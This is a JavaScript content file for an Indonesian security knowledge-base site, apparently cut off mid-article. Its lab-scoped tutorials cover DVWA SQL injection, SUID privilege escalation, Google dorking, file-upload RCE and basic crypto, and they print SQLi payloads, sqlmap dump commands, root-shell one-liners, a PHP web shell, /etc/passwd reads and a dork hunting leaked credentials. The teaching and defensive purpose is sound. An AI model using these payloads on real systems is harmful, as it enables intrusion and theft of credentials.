(function () {
  function esc(str) {
    return String(str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  const COPY_ICON =
    '<svg class="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>';

  const CALLOUT_ICONS = {
    note: '<svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>',
    warning: '<svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v4m0 4h.01M4.93 4.93l14.14 14.14"/></svg>',
    tip: '<svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>',
  };

  const CALLOUT_TITLES = { note: "CATATAN", warning: "PERINGATAN", tip: "TIPS" };

  function callout(type, html, title) {
    return (
      '<div class="kb-callout ' + type + '">' +
      '<div class="flex items-center gap-2 font-mono text-sm font-semibold text-' +
      (type === "note" ? "kb-cyan" : type === "warning" ? "amber-400" : "kb-green") +
      '">' + CALLOUT_ICONS[type] + (title || CALLOUT_TITLES[type]) + "</div>" +
      '<p class="mt-2 text-sm text-slate-300">' + html + "</p></div>"
    );
  }

  function codeBlock(lang, code) {
    return (
      '<div class="code-block" data-lang="' + lang + '">' +
      '<div class="code-header">' +
      '<span class="code-dot bg-rose-500/80"></span>' +
      '<span class="code-dot bg-amber-400/80"></span>' +
      '<span class="code-dot bg-emerald-400/80"></span>' +
      '<span class="code-lang">' + lang + "</span>" +
      '<button class="copy-btn" type="button">' + COPY_ICON + " salin</button>" +
      "</div>" +
      "<pre><code>" + esc(code) + "</code></pre></div>"
    );
  }

  const articlesData = {
    "ctf-web-exploitation": {
      id: "ctf-web-exploitation",
      crumb: "SQL Injection pada Lab DVWA",
      title: "CTF Write-up: SQL Injection pada Lab DVWA",
      category: "cybersecurity",
      difficulty: "Intermediate",
      excerpt:
        "Step-by-step write-up eksploitasi SQL Injection di Damn Vulnerable Web Application, dari reconnaissance hingga dump seluruh database.",
      date: "2026-10-02",
      readTime: 10,
      lab: "DVWA (Docker)",
      author: "Admin KBHub",
      tags: ["ctf", "sqli", "web-exploitation", "writeup"],
      content:
        callout(
          "warning",
          "Semua teknik di artikel ini <strong>hanya untuk lab milik sendiri atau CTF yang terautorasi</strong>. Jangan pernah menguji celah pada sistem yang bukan milikmu.",
          "PERINGATAN ETIKA"
        ) +
        '<h2 id="tentang-lab">Tentang Lab &amp; Setup</h2>' +
        "<p>Damn Vulnerable Web Application (DVWA) adalah aplikasi web sengaja dibuat rentan untuk latihan. Kita akan menyerang modul <strong>SQL Injection</strong> dengan security level <code>Low</code>, di mana input user langsung masuk ke query tanpa sanitasi.</p>" +
        codeBlock(
          "bash",
          "# jalankan DVWA via Docker\ndocker run -d -p 8080:80 vulnerables/web-dvwa\n\n# akses aplikasi\n# browser → http://localhost:8080\n# login: admin / password"
        ) +
        callout(
          "note",
          "Pastikan security level di menu <em>DVWA Security</em> diset ke <strong>Low</strong> sebelum memulai, agar fokus kita pada konsep SQLi murni."
        ) +
        '<h2 id="deteksi-awal">1. Deteksi Awal (Manual)</h2>' +
        "<p>Di halaman <code>vulnerabilities/sqli/</code>, terdapat input <em>User ID</em>. Uji tanda kutip sederhana untuk memicu error:</p>" +
        codeBlock(
          "bash",
          "# input pada form User ID\n1'\n\n# hasil yang diharapkan (tanda kutip mengubah sintaks SQL):\n# You have an error in your SQL syntax; ... near '''' at line 1"
        ) +
        "<p>Error tersebut membuktikan bahwa input user dieksekusi langsung oleh database. Konfirmasi lanjutan dengan UNION-based probe:</p>" +
        codeBlock(
          "bash",
          "# deteksi jumlah kolom pada query SELECT\n1' ORDER BY 1-- -\n1' ORDER BY 2-- -\n1' ORDER BY 3-- -\n# stop ketika muncul error → jumlah kolom = angka terakhir yang berhasil"
        ) +
        '<h2 id="boolean-blind">2. Boolean-Based Blind SQLi</h2>' +
        "<p>Jika output query tidak langsung tampil (blind), kita bisa membaca data per bit menggunakan perbandingan boolean:</p>" +
        codeBlock(
          "bash",
          "# kondisi benar → data tampil\n1' AND 1=1-- -\n\n# kondisi salah → data kosong\n1' AND 1=2-- -\n\n# ekstrak karakter pertama username\n1' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'-- -"
        ) +
        '<h2 id="otomasi-sqlmap">3. Otomasi dengan sqlmap</h2>' +
        "<p>Setelah tangan terbiasa dengan mekanismenya, otomasi dengan sqlmap mempercepat ekstraksi:</p>" +
        codeBlock(
          "bash",
          "# enumerasi database yang tersedia\nsqlmap -u \"http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n  --cookie=\"security=low; PHPSESSID=SESSIONKAMU\" \\\n  --dbs\n\n# dump seluruh tabel dari database dvwa\nsqlmap -u \"http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n  --cookie=\"security=low; PHPSESSID=SESSIONKAMU\" \\\n  -D dvwa -T users --dump"
        ) +
        '<h2 id="dump-data">4. Hasil Dump &amp; Analisis</h2>' +
        "<p>Hasil akhir berupa tabel user beserta hash password-nya:</p>" +
        '<table><thead><tr><th>user_id</th><th>user</th><th>password (hash)</th></tr></thead><tbody>' +
        "<tr><td>1</td><td>admin</td><td>e6e060c2a3d17b1d0e2b0e3a1c1f8e7d</td></tr>" +
        "<tr><td>2</td><td>gordonb</td><td>e99a18c428cb38d5f260853678922e03</td></tr>" +
        "</tbody></table>" +
        "<p>Hash tersebut bisa di-crack dengan <code>hashcat</code> atau <code>john</code> — namun di CTF, biasanya flag sudah cukup didapat dari data yang berhasil di-dump.</p>" +
        '<h2 id="pencegahan">5. Pencegahan (untuk Developer)</h2>' +
        "<ul>" +
        "<li>Gunakan <strong>prepared statements</strong> / parameterized query — pisahkan antara SQL code dan data</li>" +
        "<li>Terapkan <strong>least privilege</strong> pada database user aplikasi</li>" +
        "<li>Validasi input di sisi server, jangan percaya output dari client</li>" +
        "<li>Nonaktifkan pesan error verbose di production</li>" +
        "</ul>" +
        codeBlock(
          "php",
          "<?php\n// prepared statement dengan PDO — aman dari SQLi\n$stmt = $pdo->prepare('SELECT * FROM users WHERE user_id = :id');\n$stmt->execute(['id' => $_GET['id']]);\n$user = $stmt->fetch();"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>SQL Injection tetap menjadi salah satu celah web paling berbahaya (masuk <strong>OWASP Top 10</strong>). Dari satu input yang tidak divalidasi, penyerang bisa membaca, mengubah, bahkan menghapus seluruh isi database. Solusi utamanya sederhana: <strong>parameterized query</strong>.</p>" +
        callout(
          "tip",
          "Latihan lanjutan: coba modul <strong>SQL Injection (Blind)</strong> dan <strong>SQL Injection (Stacked)</strong> di DVWA, lalu bandingkan tekniknya dengan yang sudah dipelajari di sini."
        ),
    },

    "linux-suid-privesc": {
      id: "linux-suid-privesc",
      crumb: "Privilege Escalation via SUID",
      title: "Linux Privilege Escalation via SUID Binary",
      category: "linux",
      difficulty: "Advanced",
      excerpt:
        "Pelajari cara menemukan dan mengeksploitasi binary berflag SUID untuk eskalasi privilegi dari user biasa ke root di Linux.",
      date: "2026-10-08",
      readTime: 12,
      lab: "Kali Linux / Ubuntu 22.04",
      author: "Admin KBHub",
      tags: ["linux", "privesc", "suid", "security"],
      content:
        callout(
          "warning",
          "Semua teknik di artikel ini <strong>hanya untuk pembelajaran</strong> di lab milik sendiri atau CTF yang terautorasi. Eksploitasi sistem tanpa izin adalah tindakan ilegal.",
          "PERINGATAN ETIKA"
        ) +
        '<h2 id="pendahuluan">Apa itu SUID?</h2>' +
        "<p><strong>SUID (Set User ID)</strong> adalah special permission pada Unix/Linux yang, ketika diset pada sebuah file executable, memaksa proses berjalan dengan <em>privilege owner file</em>, bukan privilege user yang mengeksekusinya.</p>" +
        "<p>Pada praktiknya, jika binary milik <code>root</code> memiliki flag SUID dan tidak dikonfigurasi dengan aman, user biasa bisa memanipulasinya untuk menjalankan perintah sebagai root.</p>" +
        codeBlock(
          "bash",
          "# contoh: binary find yang memiliki flag SUID\n-rwsr-xr-x 1 root root 54320 Jan 15 10:22 /usr/bin/find\n\n# rws pada posisi owner = SUID aktif\n# eksekusi binary → proses berjalan sebagai root"
        ) +
        '<h2 id="enumerasi">1. Enumerasi Binary SUID</h2>' +
        "<p>Langkah pertama selalu enumerasi. Cari semua file dengan bit SUID di seluruh filesystem:</p>" +
        codeBlock(
          "bash",
          "# cari semua binary SUID\nfind / -perm -u=s -type f 2>/dev/null\n\n# filter hanya yang owned root\nfind / -perm -4000 -user root -type f 2>/dev/null | xargs ls -la\n\n# alternatif dengan locate (lebih cepat)\nlocate <nama-binary> | xargs ls -la 2>/dev/null"
        ) +
        callout(
          "note",
          "Fokus pada binary yang <em>tidak lazim</em> seperti <code>find</code>, <code>nmap</code>, <code>vim</code>, <code>python</code>, <code>awk</code>, dan <code>cp</code>. Binary standar SUID seperti <code>sudo</code> dan <code>passwd</code> sudah diperiksa vendor dan relatif aman."
        ) +
        '<h2 id="eksploitasi">2. Eksploitasi: GTFOBins</h2>' +
        "<p>Banyak binary SUID yang \"tidak berbahaya\" justru bisa dipakai menjalankan shell interaktif lewat parameter tertentu. Database rujukannya adalah <a href=\"https://gtfobins.github.io\" target=\"_blank\" rel=\"noopener\">GTFOBins</a>.</p>" +
        "<p>Contoh nyata dengan binary <code>find</code> yang memiliki SUID root:</p>" +
        codeBlock(
          "bash",
          "# opsi -exec menjalankan perintah lain dari dalam find\nfind . -exec /bin/sh -p \\;\n\n# verifikasi siapa kita sekarang\nwhoami\n# → root\n\nid\n# → uid=0(root) gid=0(root) groups=0(root)"
        ) +
        "<p>Contoh lain dengan <code>python</code> (jika binary python juga ber-SUID):</p>" +
        codeBlock(
          "bash",
          "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
        ) +
        '<h2 id="mitigasi">3. Mitigasi untuk Admin</h2>' +
        "<p>Sebagai sysadmin, lakukan langkah pencegahan berikut:</p>" +
        "<ul>" +
        "<li>Audit berkala: <code>find / -perm -4000 -type f 2&gt;/dev/null</code></li>" +
        "<li>Hilangkan bit SUID yang tidak perlu: <code>chmod u-s /path/binary</code></li>" +
        "<li>Gunakan <strong>principle of least privilege</strong> — berikan user hanya permission yang dibutuhkan</li>" +
        "<li>Aktifkan <strong>AppArmor/SELinux</strong> untuk membatasi konteks eksekusi binary</li>" +
        "<li>Monitor dengan tools seperti <code>auditd</code> atau <code>rkhunter</code></li>" +
        "</ul>" +
        codeBlock(
          "bash",
          "# hapus bit SUID dari binary yang tidak perlu\nsudo chmod u-s /usr/bin/find\n\n# audit: cari binary SUID yang owned root\nsudo find / -perm -4000 -user root -type f -exec ls -la {} \\;"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>SUID misconfiguration adalah salah satu jalur eskalasi privilegi paling umum di Linux. Dengan enumerasi menyeluruh dan rujukan GTFOBins, sebagian besar kasus bisa dieksploitasi dalam hitungan menit. Untuk sisi pertahanan, audit rutin dan least privilege adalah kunci utamanya.</p>" +
        callout(
          "tip",
          "Coba materi ini di lab <strong>TryHackMe</strong> (room: Linux PrivEsc) atau <strong>OverTheWire: Bandit</strong> untuk mempertajam skill enumeration kamu.",
          "LATIHAN"
        ),
    },

    "mikrotik-basic": {
      id: "mikrotik-basic",
      crumb: "VLAN & Inter-VLAN Routing",
      title: "Konfigurasi VLAN & Inter-VLAN Routing di MikroTik",
      category: "networking",
      difficulty: "Intermediate",
      excerpt:
        "Panduan lengkap membagi jaringan ke dalam beberapa VLAN menggunakan MikroTik RouterOS beserta konfigurasi inter-VLAN routing.",
      date: "2026-10-05",
      readTime: 15,
      lab: "RouterOS v7 (CHR)",
      author: "Admin KBHub",
      tags: ["mikrotik", "vlan", "routing", "networking"],
      content:
        '<h2 id="konsep-topologi">1. Konsep &amp; Topologi</h2>' +
        "<p><strong>VLAN (Virtual LAN)</strong> membagi satu switch fisik menjadi beberapa jaringan logis yang terisolasi. Untuk latihan ini kita pakai topologi 3 VLAN:</p>" +
        '<table><thead><tr><th>VLAN ID</th><th>Nama</th><th>Subnet</th><th>Gateway</th></tr></thead><tbody>' +
        "<tr><td>10</td><td>Management</td><td>192.168.10.0/24</td><td>192.168.10.1</td></tr>" +
        "<tr><td>20</td><td>Staff</td><td>192.168.20.0/24</td><td>192.168.20.1</td></tr>" +
        "<tr><td>30</td><td>Guest</td><td>192.168.30.0/24</td><td>192.168.30.1</td></tr>" +
        "</tbody></table>" +
        "<p>Router MikroTik berperan sebagai <strong>gateway</strong> (inter-VLAN routing dilakukan di L3, bukan di switch).</p>" +
        '<h2 id="membuat-vlan">2. Membuat Interface VLAN</h2>' +
        "<p>Buat tiga interface VLAN di atas port uplink (<code>ether1</code>):</p>" +
        codeBlock(
          "bash",
          "# akses terminal RouterOS\n[admin@MikroTik] > /interface vlan add name=vlan10-mgmt vlan-id=10 interface=ether1\n[admin@MikroTik] > /interface vlan add name=vlan20-staff vlan-id=20 interface=ether1\n[admin@MikroTik] > /interface vlan add name=vlan30-guest vlan-id=30 interface=ether1\n\n# verifikasi\n[admin@MikroTik] > /interface vlan print"
        ) +
        callout(
          "note",
          "Port uplink ke switch harus di-<strong>trunk</strong> (mendukung multiple VLAN). Di switch managed, port tersebut biasanya diconfigurasi mode trunk dengan allowed VLAN 10,20,30."
        ) +
        '<h2 id="ip-dhcp">3. Alamat IP &amp; DHCP Server</h2>' +
        "<p>Set gateway pada tiap VLAN, lalu jalankan wizard DHCP:</p>" +
        codeBlock(
          "bash",
          "/ip address add address=192.168.10.1/24 interface=vlan10-mgmt\n/ip address add address=192.168.20.1/24 interface=vlan20-staff\n/ip address add address=192.168.30.1/24 interface=vlan30-guest\n\n# wizard DHCP per VLAN\n/ip dhcp-server setup   # pilih interface → ikuti prompt"
        ) +
        '<h2 id="inter-vlan">4. Inter-VLAN Routing</h2>' +
        "<p>Karena masing-masing VLAN sudah punya gateway di router, routing antar-VLAN otomatis berjalan (connected routes). Yang perlu diperhatikan adalah <strong>firewall filter</strong> agar trafik benar-benar diizinkan:</p>" +
        codeBlock(
          "bash",
          "# izinkan trafik forward antar interface\n/ip firewall filter add chain=forward action=accept \\\n  in-interface=vlan20-staff out-interface=vlan30-guest comment=\"staff→guest\"\n\n# opsisional: izinkan guest berakses internet via NAT masquerade\n/ip firewall nat add chain=srcnat out-interface=ether1 \\\n  action=masquerade comment=\"NAT ke internet\""
        ) +
        callout(
          "warning",
          "Jangan lupa <strong>drop rule</strong> di akhir chain <code>input</code> untuk hardening management access — hanya izinkan VLAN Management (10) untuk masuk ke Winbox/SSH."
        ) +
        '<h2 id="verifikasi">5. Verifikasi</h2>' +
        "<p>Uji konektivitas dari masing-masing VLAN:</p>" +
        codeBlock(
          "bash",
          "# dari PC Staff (192.168.20.x), ping gateway & VLAN lain\nping 192.168.20.1      # gateway sendiri → OK\nping 192.168.10.1      # gateway management → OK (routing jalan)\nping 192.168.30.50      # host di VLAN guest → OK\n\n# cek tabel routing di router\n/ip route print where dst-address~\"192.168\""
        ) +
        "<p>Jika semua target terjangkau, inter-VLAN routing sudah bekerja. Uji juga <strong>isolasi</strong>-nya: host di VLAN Guest tidak boleh mengakses Winbox (TCP 8291) di VLAN Management.</p>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Pembagian VLAN membuat jaringan lebih rapi, aman, dan mudah dikelola. Kunci utamanya: <strong>VLAN = segmentasi logis</strong>, <strong>router = jembatan antar segment</strong>, dan firewall filter sebagai penjebak akses yang tidak diinginkan.</p>" +
        callout(
          "tip",
          "Praktik lanjutan: coba tambahkan <strong>VLAN 40 (IoT)</strong> yang hanya boleh mengakses internet, dan buktikan isolasinya dari VLAN Staff dengan uji ping/traceroute.",
          "LATIHAN"
        ),
    },

    "osint-google-dorking": {
      id: "osint-google-dorking",
      crumb: "Teknik Google Dorking",
      title: "OSINT Dasar: Teknik Google Dorking untuk Reconnaissance",
      category: "cybersecurity",
      difficulty: "Beginner",
      excerpt:
        "Kuasai operator pencarian khusus (site:, filetype:, inurl:) untuk mengumpulkan informasi target secara legal dan etis.",
      date: "2026-09-19",
      readTime: 9,
      lab: "Browser + OSINT Framework",
      author: "Admin KBHub",
      tags: ["osint", "google-dorking", "recon", "security"],
      content:
        callout(
          "warning",
          "OSINT hanya boleh digunakan untuk keperluan <strong>legal</strong>: riset keamanan milik sendiri, CTF, atau penugasan yang terautorasi. Mengumpulkan data pribadi orang tanpa izin melanggar privasi dan hukum.",
          "PERINGATAN ETIKA"
        ) +
        '<h2 id="konsep-dorking">Apa itu Google Dorking?</h2>' +
        "<p><strong>Google Dorking</strong> (advanced search operators) memanfaatkan operator khusus agar Google mengembalikan hasil yang sangat spesifik. Banyak penyerang memakainya untuk menemukan dokumen terpublikasi, panel admin, atau file sensitif yang tak sengaja terindeks — dan seorang defensif harus memahaminya untuk melindungi asetnya sendiri.</p>" +
        codeBlock(
          "bash",
          "# format umum dorking\nsite:domain.com          # batasi hasil ke satu domain\nfiletype:pdf             # cari tipe file tertentu\nintitle:\"index of\"       # cari direktori yang terbuka (directory listing)\ninurl:login              # cari halaman login\ncache:domain.com         # lihat versi cache Google"
        ) +
        '<h2 id="operator-umum">1. Operator yang Sering Dipakai</h2>' +
        "<p>Berikut daftar operator beserta kegunaan praktisnya dalam reconnaissance:</p>" +
        '<table><thead><tr><th>Operator</th><th>Fungsi</th><th>Contoh</th></tr></thead><tbody>' +
        "<tr><td><code>site:</code></td><td>Batas domain/subdomain</td><td><code>site:contoh.com</code></td></tr>" +
        "<tr><td><code>filetype:</code></td><td>Filter ekstensi file</td><td><code>filetype:xls</code></td></tr>" +
        "<tr><td><code>inurl:</code></td><td>Kata kunci di URL</td><td><code>inurl:admin</code></td></tr>" +
        "<tr><td><code>intitle:</code></td><td>Kata kunci di judul</td><td><code>intitle:\"dashboard\"</code></td></tr>" +
        "<tr><td><code>ext:</code></td><td>Alias filetype</td><td><code>ext:conf</code></td></tr>" +
        "<tr><td><code>-</code></td><td>Kecualikan kata</td><td><code>contoh -jobs</code></td></tr>" +
        "</tbody></table>" +
        '<h2 id="contoh-dork">2. Contoh Dork Praktis</h2>' +
        "<p>Beberapa kombinasi yang umum dipakai saat fase recon (ganti <code>contoh.com</code> dengan domain target yang sah):</p>" +
        codeBlock(
          "bash",
          "# daftar file Excel yang terindeks di domain target\nsite:contoh.com filetype:xls\n\n# cari panel login terpublikasi\nsite:contoh.com inurl:login\n\n# dokumen internal yang tak sengaja terindeks\nsite:contoh.com filetype:docx OR filetype:pdf\n\n# direktori dengan directory listing aktif\nsite:contoh.com intitle:\"index of\""
        ) +
        callout(
          "note",
          "Gabungkan beberapa operator sekaligus untuk mempersempit hasil. Perhatikan juga <strong>operator -</strong> untuk mengecualikan kata, misalnya <code>contoh.com -site:blog.contoh.com</code> agar hasil blog tidak mengganggu."
        ) +
        '<h2 id="tool-pendukung">3. Tool Pendukung</h2>' +
        "<p>Untuk otomasi dan pengumpulan hasil yang lebih rapi:</p>" +
        "<ul>" +
        "<li><strong>theHarvester</strong> — ekstrak email, subdomain, dan host dari berbagai sumber</li>" +
        "<li><strong>GHunt</strong> — analisis jejak digital akun Google</li>" +
        "<li><strong>SpiderFoot</strong> — otomasi OSINT dengan ratusan modul sumber</li>" +
        "<li><strong>Wayback Machine</strong> — melihat riwayat halaman situs yang sudah dihapus</li>" +
        "</ul>" +
        codeBlock(
          "bash",
          "# contoh: ambil email & subdomain milik domain sendiri\ntheHarvester -d contoh.com -b google,bing\n\n# cek riwayat snapshot situs lewat wayback\n# browser → https://web.archive.org/web/*/contoh.com"
        ) +
        '<h2 id="mitigasi">4. Mitigasi untuk Organisasi</h2>' +
        "<p>Agar asetmu tidak bocor lewat dorking:</p>" +
        "<ul>" +
        "<li>Blokir file sensitif di <code>robots.txt</code> dan gunakan tag <code>noindex</code></li>" +
        "<li>Jangan unggah dokumen internal ke domain publik</li>" +
        "<li>Pantau indeks Google untuk domainmu secara berkala</li>" +
        "<li>Nonaktifkan directory listing pada web server</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Google dorking adalah skill dasar OSINT yang murah namun sangat powerful. Dengan memahami cara penyerang mencari informasi, kita justru bisa menutup celah publikasi yang tidak disadari organisasi.</p>" +
        callout(
          "tip",
          "Latihan: jalankan dork <code>site:github.com filetype:env \"DB_PASSWORD\"</code> untuk memahami bagaimana kebocoran kredensial di repository publik bisa ditemukan — lalu pastikan repository milikmu tidak mengandung rahasia.",
          "LATIHAN"
        ),
    },

    "web-exploitation-file-upload-rce": {
      id: "web-exploitation-file-upload-rce",
      crumb: "File Upload hingga RCE",
      title: "Web Exploitation: File Upload Vulnerability hingga RCE",
      category: "cybersecurity",
      difficulty: "Advanced",
      excerpt:
        "Analisis celah unrestricted file upload pada aplikasi PHP, teknik bypass extension check, dan pencegahannya di sisi server.",
      date: "2026-09-07",
      readTime: 16,
      lab: "PHP 8.x + Apache (Docker)",
      author: "Admin KBHub",
      tags: ["web-exploitation", "file-upload", "rce", "php"],
      content:
        callout(
          "warning",
          "Materi ini untuk <strong>lab dan CTF yang terautorasi</strong> saja. Mengeksploitasi celah upload pada sistem produksi tanpa izin adalah tindakan kriminal.",
          "PERINGATAN ETIKA"
        ) +
        '<h2 id="konsep-rce">Apa itu RCE lewat File Upload?</h2>' +
        "<p><strong>RCE (Remote Code Execution)</strong> terjadi ketika aplikasi mengizinkan user mengunggah file yang ternyata berupa script executable (misalnya <code>.php</code>), lalu file itu dieksekusi oleh web server. Dari sini penyerang bisa menjalankan perintah apapun sebagai user web (misal <code>www-data</code>).</p>" +
        '<h2 id="enumerasi-upload">1. Enumerasi Form Upload</h2>' +
        "<p>Identifikasi dulu jenis validasi yang dipakai server:</p>" +
        codeBlock(
          "bash",
          "# cek header respons saat upload file gambar biasa\n# perhatikan Content-Type yang diterima & pesan error\n\n# informasi versi server (fingerprint)\ncurl -I http://target.local/\n# Server: Apache/2.4.52 (Ubuntu)\n# X-Powered-By: PHP/8.1.2"
        ) +
        '<h2 id="bypass-extension">2. Bypass Extension Check</h2>' +
        "<p>Aplikasi rentan sering hanya memeriksa ekstensi nama file. Berikut teknik bypass yang umum:</p>" +
        codeBlock(
          "bash",
          "# 1. ekstensi ganda (double extension)\nshell.php.jpg        # server salah parse → tetap dieksekusi sebagai php\n\n# 2. kapitalisasi ekstensi (case-sensitive check)\nshell.pHp\n\n# 3. null byte (pada PHP lama)\nshell.php%00.jpg\n\n# 4. content-type palsu (bypass check MIME type)\n# Content-Type: image/jpeg  (padahal isi file script)"
        ) +
        callout(
          "note",
          "Periksa juga apakah direktori upload <strong>mengizinkan eksekusi</strong>. Jika direktori tersebut di-set <code>php_flag engine off</code>, upload shell tidak akan berjalan meski file berhasil tersimpan."
        ) +
        '<h2 id="webshell">3. Upload Web Shell &amp; Eksekusi</h2>' +
        "<p>Setelah file shell tersimpan, akses path-nya untuk menjalankan perintah:</p>" +
        codeBlock(
          "php",
          "<?php\n// contoh web shell minimalis (HANYA untuk lab milik sendiri)\nif (isset($_GET['cmd'])) {\n    echo \"<pre>\" . shell_exec($_GET['cmd']) . \"</pre>\";\n}\n?>"
        ) +
        codeBlock(
          "bash",
          "# akses shell via browser / curl\ncurl \"http://target.local/uploads/shell.php?cmd=id\"\n# uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n# verifikasi & baca file sistem\ncurl \"http://target.local/uploads/shell.php?cmd=cat+/etc/passwd\""
        ) +
        '<h2 id="escalation">4. Dari RCE ke Akses Penuh</h2>' +
        "<p>Dengan RCE, jalur eskalasi berikutnya:</p>" +
        "<ul>" +
        "<li>Baca konfigurasi aplikasi untuk mendapatkan kredensial database</li>" +
        "<li>Drop SSH key ke <code>~/.ssh/authorized_keys</code> agar dapat akses shell persisten</li>" +
        "<li>Periksa SUID binary & cron job untuk eskalasi privilegi (lihat artikel Linux SUID)</li>" +
        "</ul>" +
        '<h2 id="pencegahan">5. Pencegahan (untuk Developer)</h2>' +
        codeBlock(
          "php",
          "<?php\n// validasi ketat: extension whitelist + re-check isi file\n$allowed = ['image/jpeg', 'image/png', 'image/gif'];\n$ext = strtolower(pathinfo($_FILES['foto']['name'], PATHINFO_EXTENSION));\nif (!in_array($_FILES['foto']['type'], $allowed) || !in_array($ext, ['jpg','png','gif'])) {\n    die('File tidak diizinkan');\n}\n// simpan di luar web-root, beri nama acak, jangan pakai nama asli\n$dest = '/var/uploads/' . bin2hex(random_bytes(16)) . '.img';\nmove_uploaded_file($_FILES['foto']['tmp_name'], $dest);"
        ) +
        "<p>Langkah tambahan di sisi server:</p>" +
        "<ul>" +
        "<li>Nonaktifkan eksekusi PHP di direktori upload (<code>php_flag engine off</code>)</li>" +
        "<li>Set nama file acak — jangan percaya nama dari user</li>" +
        "<li>Simpan file di luar document root bila memungkinkan</li>" +
        "<li>Perbarui library <strong>Fileinfo</strong> dan gunakan validasi magic bytes</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>File upload vulnerability adalah jalur cepat dari fungsi biasa menuju RCE penuh. Kuncinya bukan hanya mengecek ekstensi, tapi juga <strong>menonaktifkan eksekusi di direktori upload</strong> dan memvalidasi isi file sebenarnya.</p>" +
        callout(
          "tip",
          "Latihan: selesaikan room <strong>Upload Vulnerabilities</strong> di TryHackMe untuk berlatih berbagai teknik bypass secara legal dan terstruktur.",
          "LATIHAN"
        ),
    },

    "kriptografi-caesar-xor": {
      id: "kriptografi-caesar-xor",
      crumb: "Caesar Cipher & XOR",
      title: "Kriptografi Dasar CTF: Caesar Cipher & XOR Operation",
      category: "cybersecurity",
      difficulty: "Beginner",
      excerpt:
        "Memahami cipher klasik Caesar dan operasi bitwise XOR — dua materi wajib pemula CTF, lengkap dengan cara memecahkannya.",
      date: "2026-10-06",
      readTime: 11,
      lab: "Kali Linux + Python 3",
      author: "Admin KBHub",
      tags: ["cryptography", "ctf", "caesar", "xor"],
      content:
        '<h2 id="konsep-kripto">Dasar Kriptografi dalam CTF</h2>' +
        "<p>Soal kripto di CTF pemula umumnya bertipe <strong>kelasik</strong> (cipher klasik) atau <strong>bitwise</strong>. Dua yang paling sering muncul adalah <strong>Caesar Cipher</strong> dan <strong>XOR</strong>. Keduanya mudah dipahami asalkan kita tahu cara kerjanya.</p>" +
        '<h2 id="caesar">1. Caesar Cipher (Substitution)</h2>' +
        "<p>Caesar cipher menggeser setiap huruf sejumlah <em>shift</em> tertentu dalam alfabet. Contoh dengan shift 3: <code>A → D</code>, <code>B → E</code>, dan seterusnya. Karena alfabet hanya punya 25 kemungkinan gesekan, cipher ini bisa dibobol dengan <strong>brute force</strong>.</p>" +
        codeBlock(
          "python",
          "# brute force Caesar cipher dengan Python\ndef caesar(text, shift):\n    result = \"\"\n    for ch in text:\n        if ch.isalpha():\n            base = ord('A') if ch.isupper() else ord('a')\n            result += chr((ord(ch) - base + shift) % 26 + base)\n        else:\n            result += ch\n    return result\n\ncipher = \"Khoor Zruog\"\nfor s in range(26):\n    print(s, caesar(cipher, s))\n# output dengan shift 3 → \"Hello World\""
        ) +
        callout(
          "note",
          "Alternatif tanpa coding: gunakan tool <code>cyberchef</code> (online) atau filter <code>ROT13</code> di <code>tr</code>. Untuk soal CTF, coba semua 25 shift dan pilih hasil yang membentuk kata bermakna."
        ) +
        '<h2 id="frequency">2. Frequency Analysis</h2>' +
        "<p>Untuk cipher substitusi multi-huruf (seperti Vigenère), frekuensi huruf menjadi kunci pemecahan. Dalam bahasa Inggris, urutan huruf paling sering: <code>E T A O I N</code>.</p>" +
        codeBlock(
          "bash",
          "# hitung frekuensi huruf dari teks enkripsi\ntr -d ' ' < cipher.txt | fold -w1 | sort | uniq -c | sort -rn | head"
        ) +
        '<h2 id="xor">3. Operasi XOR</h2>' +
        "<p>XOR (exclusive OR) mengembalikan <code>1</code> jika bit berbeda, dan <code>0</code> jika sama. Sifat pentingnya: <strong>XOR dua kali dengan key yang sama mengembalikan data asli</strong> (<code>A ^ K ^ K = A</code>), sehingga banyak enkripsi sederhana memakainya.</p>" +
        '<table><thead><tr><th>A</th><th>B</th><th>A XOR B</th></tr></thead><tbody>' +
        "<tr><td>0</td><td>0</td><td>0</td></tr>" +
        "<tr><td>0</td><td>1</td><td>1</td></tr>" +
        "<tr><td>1</td><td>0</td><td>1</td></tr>" +
        "<tr><td>1</td><td>1</td><td>0</td></tr>" +
        "</tbody></table>" +
        codeBlock(
          "python",
          "# XOR enkripsi & dekripsi (prosesnya sama!)\ndef xor_bytes(data, key):\n    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])\n\nplaintext = b\"flag{crypto_is_fun}\"\nkey = b\"secret\"\nencrypted = xor_bytes(plaintext, key)\nprint(\"encrypted:\", encrypted.hex())\n\n# dekripsi: XOR lagi dengan key yang sama\nprint(\"decrypted:\", xor_bytes(encrypted, key))"
        ) +
        '<h2 id="xor-brute">4. XOR dengan Key Pendek (Brute Force)</h2>' +
